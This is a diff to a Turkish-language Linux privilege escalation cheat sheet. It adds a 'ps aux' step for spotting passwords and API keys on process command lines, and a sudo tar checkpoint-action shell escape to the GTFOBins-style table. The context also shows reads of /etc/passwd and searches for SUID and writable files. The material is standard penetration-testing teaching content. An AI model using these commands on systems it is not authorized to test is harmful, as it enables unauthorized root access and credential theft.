@@ -19,13 +19,17 @@ find / -perm -u=s -type f 2>/dev/null
 cat /etc/crontab
 ls -la /etc/cron*
 
-# 5. Yazılabilir dosyalar
+# 5. Çalışan process'lerde bilgi sızıntısı
+ps aux
+# → komut satırında şifre, API key, credential olabilir
+
+# 6. Yazılabilir dosyalar
 find / -writable -type f 2>/dev/null | grep -v proc
 
-# 6. Kullanıcıları listele
+# 7. Kullanıcıları listele
 cat /etc/passwd | grep -v nologin
 
-# 7. Kernel versiyonu (exploit ararsın)
+# 8. Kernel versiyonu (exploit ararsın)
 uname -a
 ```
 
@@ -41,6 +45,7 @@ uname -a
 | `less/more` | `sudo less /etc/passwd` → `!/bin/sh` |
 | `env` | `sudo env /bin/sh` |
 | `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
+| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
 
 **Her zaman GTFOBins'e bak:** https://gtfobins.github.io
 
